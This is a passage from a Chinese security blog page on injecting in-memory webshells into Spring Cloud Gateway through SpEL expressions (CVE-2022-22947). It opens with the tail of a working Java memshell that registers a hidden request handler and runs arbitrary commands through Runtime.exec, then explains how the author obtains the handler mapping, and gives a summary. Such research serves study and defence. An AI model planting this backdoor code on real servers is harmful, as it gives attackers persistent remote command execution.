PatternsRequestCondition(pathPattern);</span><br><span class="line">            RequestMappingInfo requestMappingInfo = <span class="keyword">new</span> RequestMappingInfo(<span class="string">""</span>, patternsRequestCondition, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            registerHandlerMethod.invoke(requestMappingHandlerMapping, <span class="keyword">new</span> SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);</span><br><span class="line">            msg = <span class="string">"inject-success"</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            msg = <span class="string">"inject-error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">executeCommand</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String execResult = <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseEntity(execResult, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那怎么获取到<code>RequestMappingHandlerMapping</code>呢？通过java-object-searcher自然可以定位到，小组的<code>@whw1sfb</code>师傅提到了一种更简便的方案，<strong>从SPEL上下文的bean当中获取！</strong></p>
+<p><img src="/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/get-RequestMappingHandlerMapping.png" alt="从Bean中获取RequestMappingHandlerMapping"></p>
+<p><img src="/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/inject-spring-requestmapping-memshell.png" alt="注册Spring requestmapping内存马"></p>
+<p><img src="/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/spring-requestmapping-memshell.png" alt="Spring RequestMapping内存马"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>从最后的效果来看，spring层的内存马更好做兼容性，因为可以直接从bean当中获取目标对象，唯一要考虑的就是注入方法在各个版本是否兼容。</p>
+<p>关于各个协议和组件的内存马的构造思路其实都大同小异，说白了就是分析涉及处理请求的对象，阅读它的源码看看是否能获取请求内容，同时能否控制响应内容。然后分析该对象是如何被注册到内存当中的，最后我们只要模拟下这个过程即可。</p>
+<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul>
+<li><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/" target="_blank" rel="noopener">CVE-2022-22947: SpEL Casting and Evil Beans</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+<div style="border: 1px #2bbc8a;padding: 100px;text-align: center;border-radius: 5px;">
+    <img src="/about/wx_public.jpg" width="280" alt="">
+</div>
+
+
+
+
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'e47c5d37e969e470f60b',
+        clientSecret: '82b90182f62c79794f62979f6841b4199281b01d',
+        repo: 'ws4.github.io',
+        owner: 'ws4',
+        admin: "ws4",
+        id: '2022-03-08T00-14-20',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/gossip/">闲言碎语</a></li>
+         
+          <li><a href="/links/">左邻右舍</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-背景"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-高可用Payload"><span class="toc-number">2.</span> <span class="toc-text">0x01 高可用Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-netty层内存马"><span class="toc-number">3.</span> <span class="toc-text">0x02 netty层内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Spring层内存马"><span class="toc-number">4.</span> <span class="toc-text">0x03 Spring层内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考资料"><span class="toc-number">6.</span> <span class="toc-text">0x05 参考资料</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&text=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&is_video=false&description=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring cloud gateway通过SPEL注入内存马&body=Check out this article: https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&name=Spring cloud gateway通过SPEL注入内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    Copyright &copy; 2017 ~ 2022 c0ny1
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?a50c39f542eebaf72e68c9ff51a854bc";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+
+
+	<script>
+		(function(){
+			var bp = document.createElement('script');
+			var curProtocol = window.location.protocol.split(':')[0];
+			if (curProtocol === 'https') {
+				bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+			}
+			else {
+				bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+			}
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(bp, s);
+		})();
+	</script>
+
+
+
+
+
+
+	<script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+	<script src="/js/fancybox.js"></script>
+	<link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
